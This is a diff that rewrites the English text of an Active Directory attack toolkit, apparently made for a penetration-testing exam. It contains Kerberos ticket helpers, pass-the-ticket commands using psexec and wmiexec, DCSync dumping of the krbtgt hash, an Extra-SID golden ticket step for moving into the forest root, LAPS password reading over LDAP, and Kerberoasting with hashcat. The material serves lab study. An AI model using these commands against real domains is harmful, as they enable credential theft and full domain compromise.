-    info "Note on the Rubeus side base64 -> file: the base64 string must be a single line, do not bring the log timestamp into it"
+    info "After converting: export KRB5CCNAME=$out then klist -e to confirm the principal (e.g. DC01\$)"
+    info "Rubeus-side base64 -> file caveat: the base64 string must be a single line, do not drag log timestamps into it"
 }
 
 # ---------------------------------------------------------------------------
 mode_tgt() {
     require_mode_arg DOMAIN DC USER
     if [ -z "$PASS" ] && [ -z "$NTHASH" ]; then
-        err "tgt mode requires -p PASS or -H NTHASH"; exit 1
+        err "tgt mode needs -p PASS or -H NTHASH"; exit 1
     fi
     local out="$OUTFILE"
     [ -z "$out" ] && out="$TICKET_DIR/$USER.ccache"
-    head_ "Get TGT (impacket-getTGT) -> $out"
+    head_ "Get a TGT (impacket-getTGT) -> $out"
     if [ -n "$NTHASH" ]; then
         run impacket-getTGT -dc-ip "$DC" -hashes ":$NTHASH" "$DOMAIN/$USER"
     else
         run impacket-getTGT -dc-ip "$DC" "$DOMAIN/$USER:$PASS"
     fi
     echo
-    info "getTGT outputs USER.ccache by default in the current directory, mv to the ticket directory before using -o:"
+    info "getTGT writes USER.ccache into the current directory by default; mv it into the ticket directory before using -o:"
     echo "mv $USER.ccache $out && export KRB5CCNAME=$out && klist -e"
-    info "(impacket-getTGT does not support -o, the output name is fixed to <username>.ccache)"
+    info "(impacket-getTGT has no -o; the output name is fixed to <username>.ccache)"
 }
 
 # ---------------------------------------------------------------------------
 mode_tgs() {
     require_mode_arg SPN
-    head_ "Apply for TGS by service (tgs): $SPN"
-    info "Method 1 (with TGT in the cache, the cleanest): kvno - directly use the existing ticket to request a service ticket from KDC"
+    head_ "Request a TGS per service (tgs): $SPN"
+    info "Path one (a TGT is already in the cache; cleanest): kvno - ask the KDC for a service ticket using the existing ticket"
     run kvno "$SPN"
     echo
-    info "Method 2 (use impacket-getST when RBCD/constrained delegation requires S4U, service account credentials are required)"
+    info "Path two (use impacket-getST when RBCD/constrained delegation needs S4U; requires service account credentials)"
     if [ -n "$USER" ]; then
         local cred="$DOMAIN/$USER"
         [ -n "$PASS" ] && cred="$cred:$PASS"
@@ -446,61 +446,61 @@ mode_tgs() {
     fi
     echo
     run klist -e
-    info "After confirming that the service ticket of $SPN appears in the klist, use -m auth to access the corresponding service."
+    info "Once the $SPN service ticket shows up in klist, use -m auth to reach the matching service."
 }
 
 # ---------------------------------------------------------------------------
 mode_auth() {
     require_mode_arg DOMAIN TARGET
-    head_ "Pass Windows service (auth) with existing ticket - all -k -no-pass"
-    info "Prefix: export KRB5CCNAME=$CCACHE and then klist -e to confirm who is the subject in the ticket"
+    head_ "Hit Windows services with an existing ticket (auth) - all -k -no-pass"
+    info "Prerequisite: export KRB5CCNAME=$CCACHE   then klist -e to confirm which principal is on the ticket"
     local u="$USER"
-    [ -z "$u" ] && u="USER"     # Not given -u When printing, press the placeholder, and whoever is on the ticket will walk as that person.
+    [ -z "$u" ] && u="USER"     # with no -u we print the placeholder; whoever is on the ticket is who you act as
     echo
-    echo "# 1) Read-only verification (do this step first, confirm that the ticket identity is sufficient and then use the execution tool)"
+    echo "# 1) Read-only validation (do this first; only reach for execution tools once the ticket identity is enough)"
     run smbclient -k -L "//$TGT_HOST"
     echo
-    echo "# 2) TGS of cifs/TARGET is required (the tool will automatically apply)"
+    echo "# 2) Needs a cifs/TARGET TGS (the tool requests it automatically)"
     run impacket-wmiexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
     run impacket-smbexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
     run impacket-psexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
     echo
-    echo "# 3) DCSync (the subject in the ticket needs to be a DC machine account or an identity with replication permissions)"
+    echo "# 3) DCSync (the ticket principal must be a DC machine account or hold replication rights)"
     [ -z "$DC" ] && DC="$TGT_HOST"
     run impacket-secretsdump -k -no-pass "$DC"
     run impacket-secretsdump -k -no-pass -just-dc-user krbtgt "$DC"
     echo
-    echo "# 4) WinRM (requires TGS for wsman/TARGET)"
+    echo "# 4) WinRM (needs a wsman/TARGET TGS)"
     run evil-winrm -i "$TGT_HOST" -r "$DOMAIN" -k
     echo
-    info "Without -k but want to use domain user password/hash (for comparison):"
+    info "If you have no -k but do have a domain user password/hash (for comparison):"
     echo "impacket-wmiexec $DOMAIN/USER@$TGT_HOST -hashes :NTHASH"
     echo
-    info "Failed branch:"
-    info "· smbclient reports KRB_AP_ERR_MODIFIED -> Whether FQDN is consistent with SPN (do not use short name/IP)"
-    info "· Report that KDC does not support the encryption type -> change the enctypes of /etc/krb5.conf (see -m krb5conf)"
+    info "Failure branches:"
+    info "  - smbclient reports KRB_AP_ERR_MODIFIED -> check the FQDN matches the SPN (no short name, no IP)"
+    info "  - KDC reports an unsupported enctype -> change enctypes in /etc/krb5.conf (see -m krb5conf)"
     info "  · Clock skew -> sudo ntpdate $DC"
-    info "  · 目标只在内网段 -> Do port forwarding first/Ligolo（docs/08），After forwarding Kerberos，"
-    info "    且转发路径上的机器也要能到 DC of 88"
+    info "  - Target reachable only from the internal segment -> forward the port first / Ligolo (docs/08), Kerberos after that,"
+    info "    and every machine on the forwarding path must also reach port 88 on the DC"
 }
 
 # ---------------------------------------------------------------------------
 mode_cross() {
-    head_ "Linux -> Windows cross-domain steps (cross, scenario 53 connection)"
-    info "① First confirm which domain the current ticket belongs to: klist -e (the suffix of Default principal is the domain)"
+    head_ "Linux -> Windows cross-domain steps (cross, bridge to scenario 53)"
+    info "1) Confirm which domain the current ticket belongs to: klist -e (the suffix of Default principal is the domain)"
     run klist -e
     echo
-    info "② Horizontally within the same domain: direct -m auth (-d uses subdomain FQDN, -t uses subdomain host FQDN)"
+    info "2) Lateral movement inside the same domain: just use -m auth (-d takes the subdomain FQDN, -t a host FQDN in that subdomain)"
     echo
-    info "③ Subdomain -> Lin Gen: Only when Lin's father and son trust each other and SID filtering is not enabled, can you get the Extra SID golden ticket."
-    info "The judgment and complete commands are in m12-laps-and-trust-notes.md; the core three steps:"
-    echo "impacket-ticketer -nthash <subdomain krbtgt NT> -domain child.$DOMAIN \\"
-    echo "-domain-sid <subdomain SID> -extra-sid '<root domain SID>-519' Administrator"
+    info "3) Subdomain -> forest root: an Extra SID golden ticket only comes into play when the forest parent-child trust exists and SID filtering is off."
+    info "   The checks and the full commands are in m12-laps-and-trust-notes.md; the core three steps:"
+    echo "   impacket-ticketer -nthash <subdomain krbtgt NT hash> -domain child.$DOMAIN \\"
+    echo "       -domain-sid <subdomain SID> -extra-sid '<root domain SID>-519' Administrator"
     echo "   export KRB5CCNAME=Administrator.ccache"
-    echo "impacket-secretsdump -k -no-pass <rootDC FQDN>"
+    echo "   impacket-secretsdump -k -no-pass <root DC FQDN>"
     echo
-    info "④ /etc/hosts must be able to resolve the FQDN of the subdomain DC and the root DC at the same time (generated by -m hosts)"
-    info "⑤ If the trust is external/forest (SID filtering is turned on) -> Extra SID is invalid, return to enumeration to find other entries."
+    info "4) /etc/hosts must resolve both the subdomain DC FQDN and the root DC FQDN (generate with -m hosts)"
+    info "5) If the trust is external/forest-wide (SID filtering on) -> Extra SID is useless; go back to enumeration for another entry point."
 }
 
 # ---------------------------------------------------------------------------
@@ -516,42 +516,42 @@ case "$MODE" in
     auth)     mode_auth ;;
     cross)    mode_cross ;;
     all)      mode_info; mode_krb5conf; mode_hosts; mode_auth ;;
-    *) err "Unknown mode: $MODE"; usage ;;
+    *)        err "Unknown mode: $MODE"; usage ;;
 esac
 
-printf '\n[*] Mode %s ended. By default, only the command is printed; add -x to actually execute it. \n' "$MODE"
-info "Next step: get the ticket -> -m convert/tgs processing -> -m auth implementation; see cross-domain -m cross."
+printf '\n[*] Mode %s finished. Commands are printed by default; add -x to actually run them.\n' "$MODE"
+info "Next: get a ticket -> refine with -m convert/tgs -> land it with -m auth; for cross-domain see -m cross."
 ````
 
-## Scenario 49: There is no local privilege escalation path, but the current domain user can read LAPS
+## Scenario 49: No local privilege escalation path, but the current domain user can read LAPS
 
-**Situation**: The initial session is a normal domain user; there is no privilege escalation point on this machine; but the directory ACL allows reading the local administrator password (LAPS) of **another machine**. Goal: Execute remotely as the local administrator of the machine.
+**Situation**: The initial session is a plain domain user; there is no local privilege escalation on this host; but the directory ACL allows reading the local administrator password (LAPS) of **another machine**. Goal: execute remotely as that machine's local administrator.
 
-**Assumptions**: The target domain has deployed LAPS and the current user has read permission on the password attribute (the domain user group is usually authorized to read during deployment, or you obtain it through ACL/GenericRead); the LAPS password is the password of the local Administrator of the target machine, not the domain user. First, distinguish whether the target uses **traditional LAPS (AdmPwd, attribute `ms-Mcs-AdmPwd*`)** or **Windows LAPS (attribute `msLAPS-Password*`)**. The two query methods are different.
+**Assumptions**: The target domain has LAPS deployed and the current user can read the password attribute (deployment usually grants read to Domain Users, or you obtained it via ACL/GenericRead); the LAPS password is the password of the **target machine's local Administrator**, not a domain user. First work out whether the target uses **legacy LAPS (AdmPwd, attribute `ms-Mcs-AdmPwd*`)** or **Windows LAPS (attribute `msLAPS-Password*`)** - the two are queried differently.
 
-**Prepare (attacker)**: Confirm LDAP query (`ldapsearch` or impacket); prepare remote execution template (target is 445 → `wmiexec/psexec`; only 5985 → WinRM). **Windows side** query script: `m12-ad-enum-windows.ps1`.
+**Prepare (attacker side)**: Confirm you can query LDAP (`ldapsearch` or impacket); prepare remote-execution templates (target has 445 -> `wmiexec/psexec`; only 5985 -> WinRM). **Windows-side** query script: `m12-ad-enum-windows.ps1`.
 
-**Procedure**：
+**Procedure**:
 ```bash
-# Attack machine (Linux) directly reads attributes from LDAP - first detect which version of LAPS exists (check both attributes)
+# Attack machine (Linux) reads the attributes straight over LDAP - first probe which LAPS version is present (query both attributes)
 ldapsearch -x -H ldap://DC01.corp.local -D "CORP\\USER" -w 'PASS' \
   -b "DC=corp,DC=local" "(objectClass=computer)" \
   ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword
-# Execute remotely after getting the clear text
+# Execute remotely once you have the cleartext
 impacket-wmiexec CORP/Administrator@WS02.corp.local -hashes :NTHASH   # or -p 'password'
 ```
-Windows side (session machine）：`m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02`；A quick look at the two versions of the command `m12-laps-and-trust-notes.md`。
+Windows side (session host): `m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02`; a quick reference for both versions is in `m12-laps-and-trust-notes.md`.
 
-**Scripts used**: `m12-ad-enum-windows.ps1` (LAPS two-version query + enumeration), `m12-ad-enum-linux.sh` (LDAP batch enumeration with LAPS attributes), `m12-laps-and-trust-notes.md` (command quick check).
+**Scripts used**: `m12-ad-enum-windows.ps1` (both LAPS versions + enumeration), `m12-ad-enum-linux.sh` (bulk LDAP enumeration including LAPS attributes), `m12-laps-and-trust-notes.md` (command quick reference).
 
-**Validation**: The read password can successfully enter WS02 for `wmiexec`/`psexec`; if the password "looks right but cannot be entered", first verify whether the password is for WS02 (LAPS passwords vary by machine), and confirm that the remote execution protocol is open.
+**Validation**: The password you read gets you into WS02 with `wmiexec`/`psexec`; if the password looks right but will not work, first confirm it belongs to WS02 (LAPS passwords are per-machine), then confirm the remote-execution protocol is open.
 
-**Failure branches and alternatives**：
-- Property is empty/Can't read → ① The machine may not be enabled LAPS Or reset the password before it expires, change the machine to enumerate (check the entire domain at once `(ms-Mcs-AdmPwd=*)`）；② The current user does not have read permissions → Find other entrances to this module（RBCD/delegate/certificate) first escalate to an identity with read permissions。
-- Windows LAPS What is saved is `msLAPS-EncryptedPassword`（encrypted value）→ Plain text reading requires `Get-LapsADPassword`（Decryption is done by the target machine key) or with DC side LAPS module; pure LDAP When the clear text cannot be obtained**Don't fight to the death**，Change `msLAPS-Password` Plaintext mode machines, or falling back to traditional LAPS machine。
-- Only open WinRM Not open SMB → Change `evil-winrm`；Neither agreement is opened → LAPS The password is useless, go back to enumeration to find other entrances。
+**Failure branches and alternatives**:
+- Attribute empty / unreadable -> (1) the machine may not have LAPS enabled or the password has not been rotated yet - enumerate other machines (query the whole domain at once with `(ms-Mcs-AdmPwd=*)`); (2) the current user genuinely lacks read access -> use another entry point from this module (RBCD/delegation/certificate) to escalate to an identity that can read it.
+- Windows LAPS stores `msLAPS-EncryptedPassword` (an encrypted value) -> reading cleartext requires `Get-LapsADPassword` (decryption is done with the target machine's key) or the LAPS module on the DC; when plain LDAP cannot get cleartext, **do not keep hammering it** - switch to a machine in `msLAPS-Password` cleartext mode, or fall back to a legacy LAPS machine.
+- WinRM open but SMB closed -> use `evil-winrm`; both closed -> the LAPS password is useless, go back to enumeration for another entry point.
 
-**Exam / OPSEC notes**: LAPS query will generate LDAP audit logs, which is an expected enumeration behavior. However, do not do an indiscriminate password dump for the entire domain and then try randomly one by one; the execution target only selects the machine required by the scenario. Do not echo the password string into a long command that can be read by the shell history (use environment variables or script parameters).
+**Exam / OPSEC notes**: LAPS queries generate LDAP audit entries; that is expected enumeration behaviour, but do not dump every password in the domain and then try them one by one - only touch the machines the scenario actually needs. Do not echo the password into a long command that stays readable in shell history (use an environment variable or a script parameter).
 
 ---
 
@@ -559,49 +559,49 @@ Windows side (session machine）：`m12-ad-enum-windows.ps1 -Mode LAPS -Computer
 
 ````powershell
 <#
-Usage: pure ADSI / .NET Implemented domain enumeration (does not rely on RSAT ActiveDirectory module and does not depend on
-      PowerView）——domain information and MAQ、Users, groups and privileged group members, computers、SPN（Kerberoast
-      Candidate), three types of delegation attributes, designated objects ACL summary、LAPS Two-version reading and readability determination。
-scene：M12 scene 49（read LAPS）、51（RBCD Prefix: find writable/Computer object with changeable delegation properties）、
-      52（Confirm service account msDS-AllowedToDelegateTo with goals SPN）、50（Find an unconstrained host）。
-      and m12-ad-enum-linux.sh It's the same thing Linux / Windows Implemented on both sides。
-rely：Windows PowerShell 2.0+ Bring your own System.DirectoryServices（DirectoryEntry /
-      DirectorySearcher）and System.Security.Principal；No administrator rights are required (no write operations)）。
-      suggestion -Domain explicit domain FQDN，Otherwise, use the domain to which the current computer belongs.。
-use：.\m12-ad-enum-windows.ps1 -Mode All
+Purpose: pure ADSI / .NET domain enumeration (no RSAT ActiveDirectory module and no
+      PowerView) - domain info and MAQ, users, groups and privileged group members, computers, SPN (Kerberoast
+      candidates), the three delegation attributes, an ACL summary for a given object, and both LAPS versions with a readability verdict.
+Scenario: M12 scenario 49 (read LAPS), 51 (RBCD prerequisite: find a computer object with a writable/editable delegation attribute),
+      52 (confirm the service account's msDS-AllowedToDelegateTo and the target SPN), 50 (find an unconstrained host).
+      Same job as m12-ad-enum-linux.sh, implemented for both Linux and Windows.
+Dependencies: Windows PowerShell 2.0+ ships System.DirectoryServices (DirectoryEntry /
+      DirectorySearcher) and System.Security.Principal; no administrator rights needed (and no write operations).
+      Prefer giving -Domain explicitly as the domain FQDN; otherwise the current computer's domain is used.
+Usage: .\m12-ad-enum-windows.ps1 -Mode All
       .\m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02
       .\m12-ad-enum-windows.ps1 -Mode Delegation
       .\m12-ad-enum-windows.ps1 -Mode ACL -AclTarget "CN=WS02,CN=Computers,DC=corp,DC=local"
       .\m12-ad-enum-windows.ps1 -Mode Users -MaxResults 50 -Domain corp.local
-placeholder：DOMAIN=domain FQDN（corp.local） TARGET=domain name/hostname（WS02） USER=domain username
-      PASS=Password (this script is a read-only enumeration, no credentials are required；PASS Appears only in subsequent print commands）
-      ——Before running, replace the above placeholders with the real values ​​of the exam environment. No real values ​​are hardcoded in the script.。
-Test status: Not available Windows Actual measurement of domain environment; use parentheses on this machine/The quotation mark pairing check passes, and the logic presses ADSI standard
-      Usage writing (equivalent to cheat sheet "AD Enumeration / LDAP" Chapter command）。
-and docs/12-ad-attacks.md Description of the difference：
-  1) document writing `-Mode LAPS -ComputerName WS02`：this script -ComputerName 可带或不带结尾
-     of `$`（WS02 and WS02$ accept); do not give -ComputerName When the enumeration field is opened LAPS machine。
-  2) Document handle ACL The abstract is described as"ACL summary"，this script ACL mode only does**read**Retrieve and highlight high-risk permissions
-     （GenericAll/GenericWrite/WriteDacl/WriteOwner/ExtendedRight），No modifications will be made；
-     Delegated attribute**write**exist m12-delegation-attacks.ps1（RBCD model）。
-  3) Document not listed SPN/MAQ/The three sub-items of the privilege group are completed here for the scenario. 51/52 Direct access。
+Placeholders: DOMAIN=domain FQDN (corp.local) TARGET=domain name/hostname (WS02) USER=domain username
+      PASS=password (this script only reads and enumerates, so no credentials are needed; PASS only shows up in the follow-up commands it prints)
+      - replace the placeholders above with the real values of the exam environment before running; no real values are hardcoded in the script.
+Test status: not exercised in a Windows domain; bracket/quote pairing was checked locally and the logic follows the ADSI
+      standard usage (equivalent to the commands in the cheat sheet 'AD Enumeration / LDAP' section).
+Differences from docs/12-ad-attacks.md:
+  1) The doc writes `-Mode LAPS -ComputerName WS02`: here -ComputerName may or may not carry the trailing
+     `$` (both WS02 and WS02$ are accepted); omitting -ComputerName enumerates every LAPS-enabled machine in the domain.
+  2) The doc describes an 'ACL summary'; this script's ACL mode only **reads** and highlights high-risk permissions
+     (GenericAll/GenericWrite/WriteDacl/WriteOwner/ExtendedRight) and changes nothing;
+     **writing** delegation attributes belongs to m12-delegation-attacks.ps1 (RBCD mode).
+  3) The doc lists neither SPN/MAQ nor privileged groups; they are added here so scenarios 51/52 can use them directly.
 #>
 [CmdletBinding()]
 param(
     [ValidateSet('All','Domain','Users','Groups','Computers','SPN','Delegation','ACL','LAPS','Help')]
     [string]$Mode = 'All',
-    [string]$ComputerName = '',        # LAPS Mode: single machine（TARGET），Available with or without $
-    [string]$Domain = '',              # DOMAIN：domain FQDN，Leave blank=current domain
-    [string]$SearchRoot = '',          # Override search root DN，Leave blank=defaultNamingContext
-    [string]$AclTarget = '',           # ACL Mode: target object DN，Leave blank=domain root
-    [int]$MaxResults = 0,              # 0=No limit，>0 Truncate output (use large areas first) 50 Test the waters）
+    [string]$ComputerName = '',        # LAPS mode: a single machine (TARGET), with or without the trailing $
+    [string]$Domain = '',              # DOMAIN: domain FQDN, blank = current domain
+    [string]$SearchRoot = '',          # override the search root DN, blank = defaultNamingContext
+    [string]$AclTarget = '',           # ACL mode: target object DN, blank = domain root
+    [int]$MaxResults = 0,              # 0 = unlimited, >0 truncates output (try 50 first on a large domain)
     [switch]$Help
 )
 
 $ErrorActionPreference = 'Continue'
 
 # ---------------------------------------------------------------------------
-# Basics: Search Root/Domain SID/Universal Searcher
+# Basics: search root / domain SID / generic searcher
 # ---------------------------------------------------------------------------
 $script:RootPath = ''
 $script:DomainSID = ''
@@ -620,7 +620,7 @@ function Initialize-M12Root {
         $rootDse = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
         $nc = $rootDse.Properties['defaultNamingContext']
         if (-not $nc -or $nc.Count -eq 0) {
-            throw "Unable to obtain defaultNamingContext: The machine is not domain added or LDAP is unreachable. Please give -Domain DOMAIN explicitly"
+            throw "Cannot get defaultNamingContext: this machine is not domain-joined or LDAP is unreachable. Pass -Domain DOMAIN explicitly"
         }
         $script:RootPath = "LDAP://$($nc[0])"
         $script:DomainFqdn = (($nc[0] -split ',') | Where-Object { $_ -like 'DC=*' } |
@@ -654,7 +654,7 @@ function New-M12Searcher {
     return $s
 }
 
-# Get an attribute in the search results (return $null if it does not exist, get the first one if there are multiple values)
+# Fetch one attribute from a search result (returns $null when absent; takes the first value when multi-valued)
 function Get-M12Prop {
     param($Result, [string]$Name)
     if ($Result.Properties.Contains($Name) -and $Result.Properties[$Name].Count -gt 0) {
@@ -673,7 +673,7 @@ function Convert-M12FileTime {
     } catch { return [string]$Raw }
 }
 
-# userAccountControl key bits (just remember these few for the exam)
+# userAccountControl key bits (these few are enough for the exam)
 function Convert-M12Uac {
     param($Raw)
     if (-not $Raw) { return '' }
@@ -684,10 +684,10 @@ function Convert-M12Uac {
     if ($v -band 0x000020)  { $flags += 'PasswdNotReqd' }
     if ($v -band 0x002000)  { $flags += 'PASSWD_NOT_EXPIRED' }
     if ($v -band 0x020000)  { $flags += 'DONT_REQ_PREAUTH(ASREP)' }
-    if ($v -band 0x040000)  { $flags += 'TrustedForDelegation(unconstrained)' }
-    if ($v -band 0x080000)  { $flags += 'NOT_DELEGATED (sensitive cannot be delegated)' }
+    if ($v -band 0x040000)  { $flags += 'TrustedForDelegation (unconstrained)' }
+    if ($v -band 0x080000)  { $flags += 'NOT_DELEGATED (sensitive, cannot be delegated)' }
     if ($v -band 0x100000)  { $flags += 'USE_DES_ONLY' }
-    if ($v -band 0x200000)  { $flags += 'TrustedToAuthForDelegation(protocol conversion)' }
+    if ($v -band 0x200000)  { $flags += 'TrustedToAuthForDelegation (protocol transition)' }
     return ($flags -join ',')
 }
 
@@ -704,15 +704,15 @@ function Limit-M12Rows {
 }
 
 # ---------------------------------------------------------------------------
-# Domain: domain information + MAQ (scenario 51 to confirm MachineAccountQuota > 0)
+# Domain: domain information + MAQ (scenario 51 needs MachineAccountQuota > 0 confirmed)
 # ---------------------------------------------------------------------------
 function Get-M12DomainInfo {
     Write-M12Head "Domain information (Domain)"
-    Write-Output "Search root: $script:RootPath"
-    Write-Output "Domain FQDN: $script:DomainFqdn"
-    Write-Output "Domain SID: $script:DomainSID"
+    Write-Output "Search root   : $script:RootPath"
+    Write-Output "Domain FQDN   : $script:DomainFqdn"
+    Write-Output "Domain SID    : $script:DomainSID"
     $me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-    Write-Output "Current identity: $($me.Name) (Authentication type $($me.AuthenticationType))"
+    Write-Output "Current identity: $($me.Name)  (authentication type $($me.AuthenticationType))"
 
     $s = New-M12Searcher -Filter '(objectClass=domainDNS)' `
         -Properties @('distinguishedName','ms-DS-MachineAccountQuota','msDS-Behavior-Version')
@@ -720,17 +720,17 @@ function Get-M12DomainInfo {
     if ($r) {
         $maq = Get-M12Prop $r 'ms-DS-MachineAccountQuota'
         if ($maq) {
-            Write-Output "MachineAccountQuota : $maq (scenario 51 RBCD requires > 0, default 10)"
+            Write-Output "MachineAccountQuota : $maq   (scenario 51 RBCD needs > 0; default 10)"
         } else {
-            Write-Output "MachineAccountQuota: not read (old domain or insufficient permissions, estimated at 10, please confirm again when RBCD fails to add the machine)"
+            Write-Output "MachineAccountQuota : not read (old domain or insufficient rights; assume 10 and re-check if RBCD machine creation fails)"
         }
         $func = Get-M12Prop $r 'msDS-Behavior-Version'
-        if ($func) { Write-Output "Domain functional level msDS-Behavior-Version: $func" }
+        if ($func) { Write-Output "Domain functional level msDS-Behavior-Version : $func" }
     }
 
     # DC list
     Write-Output ""
-    Write-Output "--- Domain Controller (fall back to Computers container approximation when configuration partition is unreliable) ---"
+    Write-Output "--- Domain controllers (falls back to an approximation from the Computers container when the configuration partition is unreliable) ---"
     $s2 = New-M12Searcher -Filter '(&(objectCategory=computer)(primaryGroupID=516))' `
         -Properties @('dnsHostName','operatingSystem')
     foreach ($c in $s2.FindAll()) {
@@ -742,7 +742,7 @@ function Get-M12DomainInfo {
 # Users
 # ---------------------------------------------------------------------------
 function Get-M12Users {
-    Write-M12Head "Domain users (Users) - follow description plain text password / adminCount=1 / no pre-authentication"
+    Write-M12Head "Domain users (Users) - watch for cleartext passwords in description / adminCount=1 / no pre-auth"
     $s = New-M12Searcher -Filter '(&(objectCategory=person)(objectClass=user))' `
         -Properties @('sAMAccountName','userPrincipalName','description','adminCount','pwdLastSet','lastLogon','userAccountControl','servicePrincipalName')
     $rows = @()
@@ -759,19 +759,19 @@ function Get-M12Users {
     Limit-M12Rows $rows | Sort-Object SamAccountName |
         Format-Table -AutoSize SamAccountName, UPN, AdminCount, UAC, LastLogon, Description |
         Out-String -Width 220 | Write-Output
-    Write-Output "AS-REP Roasting candidates (UAC with DONT_REQ_PREAUTH):"
+    Write-Output "AS-REP Roasting candidates (UAC contains DONT_REQ_PREAUTH):"
     $s3 = New-M12Searcher -Filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' `
         -Properties @('sAMAccountName')
     foreach ($r in $s3.FindAll()) { Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName')) }
 }
 
 # ---------------------------------------------------------------------------
-# Groups: All groups + privileged group members (according to well-known RID, language-independent writing)
+# Groups: all groups + privileged group members (located by well-known RID, so the language of the group name does not matter)
 # ---------------------------------------------------------------------------
 function Get-M12Groups {
-    Write-M12Head "Privileged group members (Groups) - Use SID RID to locate, not affected by Chinese and English group names"
+    Write-M12Head "Privileged group members (Groups) - located by SID RID, unaffected by localized group names"
     if (-not $script:DomainSID) {
-        Write-Output "[!] Unable to get domain SID, skip privilege group resolution (try using -Domain DOMAIN to specify it explicitly)"
+        Write-Output "[!] Cannot get the domain SID, skipping privileged group resolution (try passing -Domain DOMAIN explicitly)"
         return
     }
     $rids = @{
@@ -788,10 +788,10 @@ function Get-M12Groups {
         Write-Output ("--- {0} ({1}) ---" -f $rids[$rid], (Get-M12Prop $r 'sAMAccountName'))
         $members = $r.Properties['member']
         if ($members) { foreach ($m in $members) { Write-Output ("  " + $m) } }
-        else { Write-Output "(no members)" }
+        else { Write-Output "  (no members)" }
     }
 
-    Write-M12Head "All groups (name + number of members)"
+    Write-M12Head "All groups (name + member count)"
     $s2 = New-M12Searcher -Filter '(objectClass=group)' -Properties @('sAMAccountName','member','adminCount')
     $rows = @()
     foreach ($r in $s2.FindAll()) {
@@ -809,7 +809,7 @@ function Get-M12Groups {
 # Computers
 # ---------------------------------------------------------------------------
 function Get-M12Computers {
-    Write-M12Head "Domain computers (Computers) - pay attention to OS (old system = local privilege escalation) and login time"
+    Write-M12Head "Domain computers (Computers) - watch the OS (old systems = local privilege escalation surface) and last logon"
     $s = New-M12Searcher -Filter '(objectClass=computer)' `
         -Properties @('sAMAccountName','dnsHostName','operatingSystem','operatingSystemVersion','lastLogon','distinguishedName')
     $rows = @()
@@ -827,31 +827,31 @@ function Get-M12Computers {
 }
 
 # ---------------------------------------------------------------------------
-# SPN: Kerberoast candidate
+# SPN: Kerberoast candidates
 # ---------------------------------------------------------------------------
 function Get-M12Spn {
-    Write-M12Head "SPN account (Kerberoast candidate, the service account for scenario 52 is also here)"
+    Write-M12Head "SPN accounts (Kerberoast candidates; scenario 52's service account is here too)"
     $s = New-M12Searcher -Filter '(&(servicePrincipalName=*)(!(objectClass=computer)))' `
         -Properties @('sAMAccountName','servicePrincipalName','adminCount','pwdLastSet','userAccountControl','memberOf')
     foreach ($r in $s.FindAll()) {
         $spns = @($r.Properties['servicePrincipalName']) -join ' | '
-        Write-Output ("Account:" + (Get-M12Prop $r 'sAMAccountName'))
+        Write-Output ("Account : " + (Get-M12Prop $r 'sAMAccountName'))
         Write-Output ("  SPN    : " + $spns)
         $uac = Convert-M12Uac (Get-M12Prop $r 'userAccountControl')
         if ($uac) { Write-Output ("  UAC    : " + $uac) }
         $mo = $r.Properties['memberOf']
-        if ($mo) { Write-Output ("Group members:" + (@($mo) -join ' | ')) }
+        if ($mo) { Write-Output ("  group members : " + (@($mo) -join ' | ')) }
     }
     Write-Output ""
-    Write-Output "Follow-up (attack machine): impacket-GetUserSPNs -dc-ip TARGET DOMAIN/USER:PASS -outputfile spn.txt"
+    Write-Output "Next (attack machine): impacket-GetUserSPNs -dc-ip TARGET DOMAIN/USER:PASS -outputfile spn.txt"
     Write-Output "               hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt"
 }
 
 # ---------------------------------------------------------------------------
-# Delegation: three categories: non-constrained / constrained / RBCD
+# Delegation: unconstrained / constrained / RBCD
 # ---------------------------------------------------------------------------
 function Get-M12Delegation {
-    Write-M12Head "Unconstrained delegation (UAC 0x80000=524288) - landing point for scenario 50"
+    Write-M12Head "Unconstrained delegation (UAC 0x80000=524288) - scenario 50's landing spot"
     $s = New-M12Searcher -Filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' `
         -Properties @('sAMAccountName','dnsHostName','distinguishedName')
     $found = $false
@@ -859,21 +859,21 @@ function Get-M12Delegation {
         $found = $true
         Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName') + "  " + (Get-M12Prop $r 'dnsHostName'))
     }
-    if (-not $found) { Write-Output "(none)" }
+    if (-not $found) { Write-Output "  (none)" }
 
-    Write-M12Head "Constrained Delegation (msDS-AllowedToDelegateTo) – Service Account for Scenario 52"
+    Write-M12Head "Constrained delegation (msDS-AllowedToDelegateTo) - scenario 52's service accounts"
     $s2 = New-M12Searcher -Filter '(msDS-AllowedToDelegateTo=*)' `
         -Properties @('sAMAccountName','msDS-AllowedToDelegateTo','userAccountControl')
     $found = $false
     foreach ($r in $s2.FindAll()) {
         $found = $true
         $uac = Convert-M12Uac (Get-M12Prop $r 'userAccountControl')
-        Write-Output ("Account:" + (Get-M12Prop $r 'sAMAccountName') + ("  [{0}]" -f $uac))
-        foreach ($t in $r.Properties['msDS-AllowedToDelegateTo']) { Write-Output ("Can be delegated to:" + $t) }
+        Write-Output ("  Account : " + (Get-M12Prop $r 'sAMAccountName') + ("  [{0}]" -f $uac))
+        foreach ($t in $r.Properties['msDS-AllowedToDelegateTo']) { Write-Output ("      can delegate to : " + $t) }
     }
-    if (-not $found) { Write-Output "(none)" }
+    if (-not $found) { Write-Output "  (none)" }
 
-    Write-M12Head "RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity already has a value) - target machine for scenario 51"
+    Write-M12Head "RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity already populated) - scenario 51's target machines"
     $s3 = New-M12Searcher -Filter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' `
         -Properties @('sAMAccountName','dnsHostName','distinguishedName')
     $found = $false
@@ -882,25 +882,25 @@ function Get-M12Delegation {
